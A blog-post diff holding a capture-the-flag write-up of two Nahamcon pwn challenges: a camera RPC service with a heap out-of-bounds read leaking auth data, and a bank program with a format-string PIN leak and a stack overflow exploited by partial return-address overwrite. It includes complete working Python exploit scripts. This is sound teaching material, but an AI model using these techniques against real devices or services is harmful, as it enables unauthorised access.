@@ -1,0 +1,836 @@
+---
+layout: post
+title: "Nahamcon Winter CTF - Pwn"
+date: 2025-12-18
+image: /assets/.
+categories: ["Nahamcon"]
+tags: [pwn, ctf2025]
+---
+
+## Snorex 2K Camera
+
+Instance: `nc 138.68.116.252 50199`
+
+### Intro: “second-hand camera, the password’s gone, but…”
+
+Picture the scenario: you just bought a second-hand CCTV, plug it in, hoping you can pair it right away—only to get “locked out”. No reset button, no friendly web UI. Just an idle “RPC” service on some port, and a curiosity that slowly turns into legal malice (because this is CTF).
+
+The **Snorex 2K Camera** challenge feels like a mini firmware image stripped down into a single binary. No ROP, no shell. Just one thing: **unlock it**—grab the flag from the remote service `nc 138.68.116.252 50199`.
+
+In this write-up I’ll walk through the flow from recon to a consistent exploit: we use an **out-of-bounds read** bug to “peek” at authentication data that should be secret, then generate a valid auth code, and finally request `FLAG`.
+
+
+### Recon: “what does this service even say?”
+
+Start with the provided file:
+
+```bash
+$ file snorex_sonia
+snorex_sonia: ELF 64-bit LSB pie executable, x86-64, dynamically linked, with debug_info, not stripped
+
+$ checksec --file=snorex_sonia
+RELRO: Full RELRO
+Canary found
+NX enabled
+PIE enabled
+Stripped: No
+Debuginfo: Yes
+```
+
+Not stripped + debug info = good news. This isn’t “blind pwn”; it’s more like reading the developer’s intent, then abusing one logic mistake.
+
+Run it locally for a moment:
+
+```bash
+$ ./snorex_sonia
+[snorex] rpc port=3500
+[rpc] listening on 3500
+```
+
+The remote server gives you `nc host port`, but no banner. So we have to reverse the protocol ourselves.
+
+Clue from `strings`:
+
+```bash
+$ strings -n 4 snorex_sonia | rg -n 'SNOREX|FLAG|Unauthorized|rpc'
+SNOREX1
+FLAG
+Unauthorized
+[rpc] listening on %u
+SNOREX_SERIAL
+SNOREX_MAC
+[snorex] rpc port=%u
+```
+
+There’s a magic `SNOREX1`, there’s `FLAG`, and there’s “Unauthorized”. That’s enough to be confident: the service has an auth gate, and if you pass it, it’ll return `getenv("FLAG")`.
+
+---
+
+### RPC Protocol: simple framing (and fun to attack)
+
+In `handle_request` (PIE offset `0x1cf0`), the read pattern is clear:
+
+- read an 8-byte header
+- interpret it as `cmd` and `len` (big-endian)
+- if `len > 0xF4240` (1,000,000) drop
+- malloc `len`, read payload
+- dispatch based on `cmd`
+
+Pseudocode (converted from ASM):
+
+```c
+// handle_request @ 0x1cf0
+int handle_request(int fd) {
+  struct { uint32_t cmd_be, len_be; } hdr;
+  if (read_full(fd, &hdr, 8) != 0) return -1;
+
+  uint32_t cmd = ntohl(hdr.cmd_be);
+  uint32_t len = ntohl(hdr.len_be);
+  if (len > 0xF4240) return -1;
+
+  uint8_t *buf = NULL;
+  if (len) {
+    buf = malloc(len);
+    if (!buf) return -1;
+    if (read_full(fd, buf, len) != 0) { free(buf); return -1; }
+  }
+
+  int rc = -1;
+  if (cmd == 0 || cmd == 1) rc = handle_auth(cmd, buf, len, fd);      // 0x1801
+  else if (cmd == 6)          rc = handle_iq(cmd, buf, len, fd);        // 0x1bba
+
+  if (buf) free(buf);
+  return rc;
+}
+```
+
+Responses are also framed as 8 bytes: `status` (u32 BE) + `len` (u32 BE) + body.
+
+This matters because once you know the framing, you don’t need to poke it manually with `nc`. Just build a small client.
+
+---
+
+### Important function map (so we don’t get lost)
+
+From `nm -an snorex_sonia`, the relevant functions (all PIE-relative offsets):
+
+```text
+0x14af refresh_secrets
+0x1574 usrMgr_getEncryptDataStr
+0x16b8 PasswdFind_getAuthCode
+0x1801 handle_auth
+0x19d6 MI_IQSERVER_GetApi
+0x1bba handle_iq
+0x1cf0 handle_request
+0x1f43 rpc_server_thread
+0x2211 load_config
+0x230d main
+```
+
+We’ll “climb the ladder” like this:
+
+1. `handle_iq` → calls `MI_IQSERVER_GetApi` and sends a buffer back to the client.
+2. `usrMgr_getEncryptDataStr` → builds a *secret-ish string* and stores it in global `g_usr_ctx`.
+3. `PasswdFind_getAuthCode` → turns that string into a 16-char auth code (hex of 8 bytes of MD5).
+4. `handle_auth` → compares the auth code. If it matches → `getenv("FLAG")`.
+
+---
+
+### Authentication: the key isn’t a password, it’s an “auth code”
+
+#### 1) `usrMgr_getEncryptDataStr` (0x1574): build context `SNOREX1 + string`
+
+This function allocates `0x108` bytes for `USR_MGR_CTX`, writes magic `SNOREX1`, then builds a string at offset `+8` using `snprintf`.
+
+The format string lives in `.rodata` around `0x301d` and shows up in a dump as:
+
+```text
+"1\n%s\n%u\n\n%s\n%s\n"
+```
+
+Arguments (from registers in ASM):
+
+- first `%s`: `SNOREX_SERIAL` (default: `FAKEZ-2K-CAM01`)
+- `%u`: timestamp (`time(NULL)`)
+- next `%s`: `SNOREX_MAC` (default: `AB:12:4D:7C:20:10`)
+- last `%s`: hex of a 15-byte secret (from `/dev/urandom` or fallback `rand()`)
+
+Pseudocode:
+
+```c
+// usrMgr_getEncryptDataStr @ 0x1574
+USR_MGR_CTX *mk_ctx(void) {
+  USR_MGR_CTX *ctx = malloc(0x108);
+  if (!ctx) return NULL;
+  refresh_secrets();                 // fill g_cfg.secret[15] + g_cfg.ts
+  memset(ctx, 0, 0x108);
+  memcpy(ctx, "SNOREX1", 7);
+  char hex_secret[32];               // built from 15 bytes => 30 hex chars
+  for (i=0;i<=14;i++) hex_secret += hex(g_cfg.secret[i]);
+  snprintf(ctx->str, 0x100, "1\n%s\n%u\n\n%s\n%s\n",
+           g_cfg.serial, g_cfg.ts, g_cfg.mac, hex_secret);
+  return ctx;
+}
+```
+
+#### 2) `PasswdFind_getAuthCode` (0x16b8): MD5, take 8 bytes, hex-encode
+
+This is the part that makes you smile, because the authenticator isn’t HMAC, isn’t AES—it’s just:
+
+- `md5(ctx->str)`
+- take the **first 8 bytes** of the digest
+- hex-encode → 16 characters
+
+Pseudocode:
+
+```c
+// PasswdFind_getAuthCode @ 0x16b8
+void get_code(char out16[17]) {
+  lock(g_usr_mutex);
+  if (!g_usr_ctx) { memcpy(out16, "0000000000000000", 17); unlock(); return; }
+  size_t n = strnlen(g_usr_ctx->str, 0x100);
+  uint8_t md5[16] = MD5(g_usr_ctx->str, n);
+  for (int i=0;i<8;i++) {
+    out16[i*2+0] = hex[(md5[i] >> 4) & 0xF];
+    out16[i*2+1] = hex[(md5[i] >> 0) & 0xF];
+  }
+  out16[16] = 0;
+  unlock(g_usr_mutex);
+}
+```
+
+#### 3) `handle_auth` (0x1801): command 1 = “give me the code, I’ll give you the flag”
+
+`cmd == 1` does:
+
+- reject if `payload == NULL` or `len <= 0xF` (so at least 16 bytes)
+- compute expected code via `PasswdFind_getAuthCode`
+- `memcmp(payload, expected, 0x10)`
+  - if equal → fetch `getenv("FLAG")`
+  - else → send `"Unauthorized\n"`
+
+The response status is a bit unusual: `status = 0` on success, `1` on failure.
+
+---
+
+### IQ API: where the bug hides (and eventually gets exposed)
+
+#### `handle_iq` (0x1bba): allocates 0x100, but can send 0x400
+
+Here’s the root issue:
+
+1. `handle_iq` always `malloc(0x100)` (256 bytes) for the response buffer.
+2. It calls `MI_IQSERVER_GetApi(payload, payload_len, &buf_ptr)` which sets `raw_len` (how many bytes “should” be sent back).
+3. **It then sends `raw_len` bytes** from that buffer, without caring that the buffer is only 0x100.
+
+Pseudocode:
+
+```c
+// handle_iq @ 0x1bba
+int handle_iq(int cmd, uint8_t *in, uint32_t in_len, int fd) {
+  uint8_t *buf = malloc(0x100);
+  memset(buf, 0, 0x100);
+  uint32_t buf_sz = 0x100;
+  uint32_t raw_len = 0;
+  MI_IQSERVER_GetApi(in, in_len, &buf, &buf_sz, &raw_len);
+
+  write_full(fd, resp_hdr(status=0, len=raw_len), 8);
+  if (raw_len) write_full(fd, buf, raw_len);   // <-- OOB READ if raw_len > 0x100
+  free(buf);
+  return 0;
+}
+```
+
+#### `MI_IQSERVER_GetApi` (0x19d6): client can “request” raw_len up to 0x400
+
+This function parses input:
+
+- first 2 bytes must be `0x2803` (magic)
+- next 2 bytes = “word count”
+- `raw_len = (word_count + 2) * 4`, capped at max `0x400`
+
+So if we send `0xFFFF`, then:
+
+```
+raw_len = (0xFFFF + 2) * 4 = 0x40004 -> capped to 0x400
+```
+
+Meaning the server will send **1024 bytes** from a buffer that was only allocated for 256 bytes. The remaining 768 bytes are **pure heap leakage**: the next chunk’s contents, allocator metadata, and whatever happens to live “after” the buffer.
+
+And… we know the heap contains `USR_MGR_CTX` with magic `SNOREX1`.
+
+---
+
+### Exploit: steal ctx → compute auth code → request FLAG
+
+The goal isn’t to “crash”, but to **get `g_usr_ctx->str`**. Strategy:
+
+1. **Heap grooming** to get a friendly layout:
+   - call IQ once (alloc+free a 0x100 buffer) so there’s a chunk of that size in tcache.
+   - call auth refresh (`cmd=0`) so the server creates `g_usr_ctx` (malloc 0x108).
+   - call IQ again with `raw_len=0x400`, so the 0x100 buffer likely reuses the tcache chunk, then over-reads into the next chunk (often: `g_usr_ctx`).
+2. From the IQ response, search for substring `SNOREX1`.
+3. Take bytes from offset `+8` up to NUL → that’s `ctx->str`.
+4. `code = md5(ctx->str)[:8].hex()` → 16 ASCII characters.
+5. Send auth request `cmd=1` with payload `code`.
+6. If it matches → the server replies with `FLAG`.
+
+Because remote heap layout can vary, this leak is **probabilistic**. Locally I saw around 50% of requests find `SNOREX1` in the dump. That’s why the solver needs retries.
+
+---
+
+### Proof in the field: commands & output
+
+Local:
+
+```bash
+$ FLAG='flag{local_test}' ./snorex_sonia
+[snorex] rpc port=3500
+[rpc] listening on 3500
+
+$ python3 solve.py --host 127.0.0.1 --port 3500
+flag{local_test}
+```
+
+Remote:
+
+```bash
+$ python3 solve.py
+flag{h3y_7h47_w4s_7074lly_0u7_0f_b0unds}
+```
+
+---
+
+### Exploit code
+
+```py
+#!/usr/bin/env python3
+import argparse
+import hashlib
+import socket
+import struct
+import time
+
+
+def recv_exact(sock: socket.socket, n: int) -> bytes:
+    data = b""
+    while len(data) < n:
+        chunk = sock.recv(n - len(data))
+        if not chunk:
+            raise EOFError("connection closed")
+        data += chunk
+    return data
+
+
+def send_req(sock: socket.socket, cmd: int, payload: bytes) -> tuple[int, int, bytes]:
+    sock.sendall(struct.pack("!II", cmd, len(payload)) + payload)
+    status, length = struct.unpack("!II", recv_exact(sock, 8))
+    body = recv_exact(sock, length) if length else b""
+    return status, length, body
+
+
+def leak_ctx(sock: socket.socket) -> bytes | None:
+    # Heap groom:
+    # - IQ request allocates/frees a 0x100 buffer (tcache size 0x110)
+    # - Auth refresh allocates the user ctx (0x108 => tcache size 0x120) right after it
+    # - Next IQ response over-reads up to 0x400 bytes and leaks the ctx chunk
+    send_req(sock, 6, b"\x28\x03\x00\x00")
+    send_req(sock, 0, b"")
+    _, _, leak = send_req(sock, 6, b"\x28\x03\xff\xff")
+
+    idx = leak.find(b"SNOREX1")
+    if idx == -1:
+        return None
+
+    return leak[idx : idx + 0x108]
+
+
+def auth_code_from_ctx(ctx: bytes) -> bytes:
+    end = ctx.find(b"\x00", 8)
+    if end == -1:
+        end = len(ctx)
+    plain = ctx[8:end]
+    return hashlib.md5(plain).digest()[:8].hex().encode()
+
+
+def solve_once(host: str, port: int, timeout: float) -> bytes | None:
+    with socket.create_connection((host, port), timeout=timeout) as sock:
+        sock.settimeout(timeout)
+        ctx = leak_ctx(sock)
+        if ctx is None:
+            return None
+        code = auth_code_from_ctx(ctx)
+        _, _, resp = send_req(sock, 1, code)
+        return resp
+
+
+def main() -> None:
+    ap = argparse.ArgumentParser(description="Snorex 2K Camera solver")
+    ap.add_argument("--host", default="138.68.116.252")
+    ap.add_argument("--port", default=50199, type=int)
+    ap.add_argument("--tries", default=20, type=int)
+    ap.add_argument("--timeout", default=3.0, type=float)
+    ap.add_argument("--delay", default=0.05, type=float)
+    args = ap.parse_args()
+
+    last_err = None
+    for attempt in range(1, args.tries + 1):
+        try:
+            resp = solve_once(args.host, args.port, args.timeout)
+            if resp is None:
+                time.sleep(args.delay)
+                continue
+            print(resp.decode(errors="replace"), end="")
+            return
+        except Exception as e:
+            last_err = e
+            time.sleep(args.delay)
+
+    raise SystemExit(f"failed after {args.tries} tries (last error: {last_err})")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Flag
+
+`flag{h3y_7h47_w4s_7074lly_0u7_0f_b0unds}`
+
+---
+
+
+## VulnBank
+
+Instance: nc 188.166.137.118 50220
+
+### Intro
+
+The name is **VulnBank**. Right from the start they’re honest: “we’re a *vuln* bank.”  
+And sure enough—this isn’t just a marketing joke. This challenge feels like a real ATM: lots of banners, lots of menus, and… two small bugs that, if you pull the thread carefully, end up as **two flags**.
+
+I’m writing this write-up as a “story”: starting from recon, sniffing strings, diving into ASM, until we get a remote-reproducible exploit.
+
+---
+
+### Recon: “what defenses does this bank use?”
+
+I started with the usual basics:
+
+```bash
+$ file vuln_bank/vulnbank
+vulnbank: ELF 64-bit LSB pie executable, x86-64, dynamically linked, stripped
+
+$ checksec --file=vuln_bank/vulnbank
+RELRO: Full
+Canary: No
+NX: Yes
+PIE: Yes
+```
+
+Conclusion:
+
+- **No canary** = stack overflows are more “friendly”.
+- **PIE** = code addresses change (ASLR) → we need a leak/bruteforce/partial overwrite.
+- **Full RELRO** = GOT overwrite isn’t possible (but we don’t need it).
+
+Run the binary to see the flow:
+
+```bash
+$ ./vuln_bank/vulnbank
+... (banner)
+Enter 6 digit PIN:
+```
+
+Okay, there’s a 6-digit PIN login, then a bank menu.
+
+---
+
+### Recon that actually helps: `strings`
+
+I like `strings` because sometimes it “sings” before we have to grind through disassembly:
+
+```bash
+$ strings -n 4 vuln_bank/vulnbank | rg -n 'FLAG|maintenance|service|Technician'
+... 
+maintenance>
+VULNBANK SERVICE TERMINAL
+VULNBANK MAINTENANCE MODE
+Technician override accepted.
+FLAG1
+FLAG2
+```
+
+Two things immediately raise an eyebrow:
+
+1. There’s a `maintenance>` prompt (like a debug console).
+2. There’s “MAINTENANCE MODE” + “FLAG2”.
+
+Meaning: **FLAG2 is on a hidden path** (not just a normal menu option).
+
+---
+
+### Function map (offsets) from `.text`
+
+Since the binary is stripped, I used radare2 to make a rough map:
+
+```bash
+$ r2 -q -e bin.relocs.apply=true -e bin.cache=true -c 'aaa; afl' vuln_bank/vulnbank
+0x00001575  ...  fcn.00001575   ; maintenance mode (prints FLAG2)
+0x00001659  ...  fcn.00001659   ; service terminal (maintenance>)
+0x0000174e  ...  fcn.0000174e   ; login PIN (prints FLAG1)
+0x000019dd  ...  fcn.000019dd   ; main menu
+```
+
+Important note: because of **PIE**, the runtime address = `PIE_base + offset`.  
+So the numbers above are **offsets** (stable), not absolute memory addresses.
+
+For the critical parts, I used `objdump` to get clean ASM:
+
+```bash
+$ objdump -d --start-address=0x174e --stop-address=0x1a00 vuln_bank/vulnbank
+$ objdump -d --start-address=0x1630 --stop-address=0x1760 vuln_bank/vulnbank
+$ objdump -d --start-address=0x1550 --stop-address=0x1660 vuln_bank/vulnbank
+```
+
+---
+
+### Chapter 1 — The login PIN that “loves to print”
+
+In the login function (offset `0x174e`), there’s a moment that looks trivial but is fatal: the user’s PIN input is used directly as a format string for `printf`.
+
+The loudest ASM snippet (offset `0x1867`):
+
+```asm
+; edx = pin (random 6 digits)
+0x1867: 8b 55 fc              mov    edx, DWORD PTR [rbp-0x4]
+0x186a: 48 8d 85 d0 fe ff ff  lea    rax, [rbp-0x130]  ; buf input
+0x1871: 89 d6                 mov    esi, edx          ; arg1 = pin
+0x1873: 48 89 c7              mov    rdi, rax          ; fmt = buf
+0x187b: e8 ...                call   printf@plt        ; printf(buf, pin)
+```
+
+Translated: the program tries to “echo” user input… but does it the wrong way.
+
+#### Login pseudocode
+
+Main offset: `0x174e` (login), format-string call: `0x1867`.
+
+```c
+int login() {
+  int pin = 0;
+  int attempts = 0;
+  int pin_generated = 0;
+  char buf[0x100];
+
+  while (attempts <= 2) {
+    printf("Enter 6 digit PIN: ");
+    fflush(stdout);
+    if (!fgets(buf, 0x100, stdin)) return 0;
+    strip_newline(buf);
+
+    if (!pin_generated) {
+      // FIRST attempt: also does printf(buf) once (still format-string)
+      printf(buf); puts("");
+      pin = gen_pin();          // /dev/urandom → 6 digit
+      pin_generated = 1;
+    }
+
+    // NEXT attempts: this is the juicy part
+    printf(buf, pin);           // BUG: user controls format string
+    puts("");
+
+    if (buf[0] == 0) { attempts++; continue; }
+    if (atoi(buf) == pin && attempts != 0) {
+      printf("Authentication flag: %s\n", getenv("FLAG1"));
+      return 1;
+    }
+    puts("Incorrect PIN.");
+    attempts++;
+    puts("");
+  }
+  puts("Too many incorrect attempts.");
+  return 0;
+}
+```
+
+There’s a funny little twist: **if the PIN is correct on the first attempt, it still fails** (`attempts != 0`).
+So the most stable flow is:
+
+1) Be wrong once on purpose.  
+2) Then log in with the correct PIN.
+
+#### Exploit for FLAG1: “make the PIN speak”
+
+Because the call is `printf(buf, pin)`, we can use a format string like `%1$d` to print the first argument (`pin`).
+
+Practical flow:
+
+- Attempt 1: send anything (so attempts becomes 1)
+- Attempt 2: send `%1$d` → the program prints the 6-digit PIN
+- Attempt 3: send the correct PIN → login succeeds → prints FLAG1
+
+Example interaction (conceptually):
+
+```text
+Enter 6 digit PIN: A
+Incorrect PIN.
+
+Enter 6 digit PIN: %1$d
+671108
+Incorrect PIN.
+
+Enter 6 digit PIN: 671108
+Authentication flag: flag{...}
+```
+
+FLAG1 obtained on remote:
+
+`flag{firs7_y0u_s734l_7h3_pin}`
+
+One flag in hand. Now it’s time for the “bank’s internal money”… aka FLAG2.
+
+---
+
+### Chapter 2 — The service terminal that breathes too long
+
+In the main menu there’s a hidden option: input `0` brings us to the “service terminal” (function offset `0x1659`) with the prompt:
+
+```
+maintenance>
+```
+
+There the program performs a `read()` with a size that makes no sense:
+
+```asm
+0x165d: 48 83 ec 50           sub    rsp, 0x50        ; buf 0x50 bytes
+...
+0x16ed: 48 8d 45 b0           lea    rax, [rbp-0x50]  ; buf
+0x16f1: ba 80 00 00 00        mov    edx, 0x80        ; read 0x80 bytes
+0x16f9: bf 00 00 00 00        mov    edi, 0           ; stdin
+0x16fe: e8 ...                call   read@plt
+...
+0x174c: leave
+0x174d: ret
+```
+
+Stack buffer: `0x50` bytes  
+`read()`: `0x80` bytes  
+Difference: **0x30 bytes of overflow** → past saved RBP → into the return address.
+
+#### Service terminal pseudocode
+
+Function offset: `0x1659`, `read` call: `0x16fe`.
+
+```c
+void service_terminal() {
+  char buf[0x50];
+
+  puts("maintenance> ");
+  fflush(stdout);
+
+  long n = read(0, buf, 0x80);     // BUG: overflow
+  if (n > 0 && buf[n-1] == '\n') buf[n-1] = 0;
+
+  puts("Request queued for processing.");
+  return;                          // RIP can be controlled
+}
+```
+
+#### RIP offset
+
+Standard stack layout:
+
+- `buf` = 0x50
+- saved RBP = 0x8
+- return address (RIP) after that
+
+So the overwrite offset to RIP:
+
+`0x50 + 0x8 = 0x58`
+
+Basic payload:
+
+```
+"A" * 0x58 + <overwrite RIP>
+```
+
+---
+
+### Chapter 3 — “Enter maintenance mode” without an absolute address
+
+We have an overflow, but the binary is **PIE**.  
+Meaning, we don’t know the absolute address of `maintenance_mode()` in memory.
+
+However… we have something more realistic for remote: **partial overwrite**.
+
+The maintenance mode function is at offset:
+
+- `maintenance_mode()` = `0x1575`
+
+We can’t write all 8 bytes of RIP accurately without leaking the PIE base, but we can:
+
+- overwrite the **lowest 2 bytes** (LSB) of the return address
+- then **bruteforce 1 nibble** (4 bits) that changes because the PIE base is always `0x1000`-aligned
+
+Why only 1 nibble?
+
+- PIE base is usually aligned to `0x1000`
+- offset `0x1575` is always the same
+- so the variation that “matters” in the last 2 bytes is usually just the part affected by page alignment → probability ~`1/16`
+
+In practice: reconnect repeatedly, and for each connection, set the low-16 bits of the return address to:
+
+```
+low16 = (k << 12) + 0x1575   with k = 0..15
+```
+
+When it “hits”, the program jumps into maintenance mode and prints FLAG2.
+
+FLAG2 on remote:
+
+`flag{7h3n_y0u_s734l_7h3_b4nk}`
+
+---
+
+### Final exploit (end-to-end)
+
+So the chain summary:
+
+1) Login:
+   - Attempt 1: send `A` (intentionally wrong)
+   - Attempt 2: send `%1$d` to leak the PIN
+   - Attempt 3: send the PIN to log in → prints FLAG1 → enters menu
+2) Enter the service terminal:
+   - choose option `0` (hidden)
+3) Trigger the overflow:
+   - send `b"A"*0x58 + p16(low16_target)`
+   - repeat connections until the PIE-base nibble “hits”
+4) Maintenance mode is called → prints FLAG2 → exit
+
+Solver:
+
+```python3
+#!/usr/bin/env python3
+from __future__ import annotations
+
+import re
+from dataclasses import dataclass
+
+from pwn import context, p16, remote
+
+
+HOST = "188.166.137.118"
+PORT = 50220
+
+
+FLAG_RE = re.compile(rb"flag\{[^}]+\}")
+
+
+@dataclass(frozen=True)
+class Flags:
+    flag1: str
+    flag2: str
+
+
+def _recv_pin_prompt(io) -> None:
+    io.recvuntil(b"Enter 6 digit PIN: ")
+
+
+def _login_and_get_flag1(io) -> str:
+    _recv_pin_prompt(io)
+    io.sendline(b"A")
+
+    _recv_pin_prompt(io)
+    io.sendline(b"%1$d")
+    leak = io.recvuntil(b"Incorrect PIN.")
+
+    pin_match = re.search(rb"\b(\d{6})\b", leak)
+    if not pin_match:
+        raise RuntimeError(f"Failed to parse PIN from leak: {leak!r}")
+    pin = pin_match.group(1)
+
+    _recv_pin_prompt(io)
+    io.sendline(pin)
+    post = io.recvuntil(b"Select option: ")
+
+    flag1_match = FLAG_RE.search(post)
+    if not flag1_match:
+        raise RuntimeError(f"Failed to parse FLAG1 from output: {post!r}")
+    return flag1_match.group(0).decode()
+
+
+def _trigger_service_overflow(io, low16: int) -> bytes:
+    io.sendline(b"0")
+    io.recvuntil(b"maintenance> ")
+    payload = b"A" * 0x58 + p16(low16)
+    io.send(payload)
+    return io.recvall(timeout=2)
+
+
+def solve() -> Flags:
+    context.log_level = "error"
+
+    flag1: str | None = None
+
+    # PIE base is randomized per connection; bits 12..15 (one hex nibble) vary,
+    # so a 2-byte partial RIP overwrite succeeds with probability ~1/16 each try.
+    # Keep retrying until we hit the right nibble.
+    for attempt in range(128):
+        k = attempt % 16
+        low16 = ((k << 12) + 0x1575) & 0xFFFF
+        io = remote(HOST, PORT)
+        try:
+            if flag1 is None:
+                flag1 = _login_and_get_flag1(io)
+            else:
+                _login_and_get_flag1(io)
+
+            out = _trigger_service_overflow(io, low16)
+            flag2_match = FLAG_RE.search(out)
+            if flag2_match:
+                if flag1 is None:
+                    raise RuntimeError("FLAG1 unexpectedly missing")
+                return Flags(flag1=flag1, flag2=flag2_match.group(0).decode())
+        finally:
+            io.close()
+
+    raise RuntimeError("Failed to obtain FLAG2 after 128 attempts")
+
+
+if __name__ == "__main__":
+    flags = solve()
+    print(flags.flag1)
+    print(flags.flag2)
+```
+
+Run:
+
+```bash
+$ python3 solve.py
+flag{firs7_y0u_s734l_7h3_pin}
+flag{7h3n_y0u_s734l_7h3_b4nk}
+```
+
+A snippet of the most important part:
+
+```py
+def _trigger_service_overflow(io, low16: int) -> bytes:
+    io.sendline(b"0")
+    io.recvuntil(b"maintenance> ")
+    payload = b"A" * 0x58 + p16(low16)
+    io.send(payload)
+    return io.recvall(timeout=2)
+
+for attempt in range(128):
+    k = attempt % 16
+    low16 = ((k << 12) + 0x1575) & 0xFFFF
+    ...
+```
+
+### Flag
+
+1. `flag{firs7_y0u_s734l_7h3_pin}`
+2. `flag{7h3n_y0u_s734l_7h3_b4nk}`
+
+---
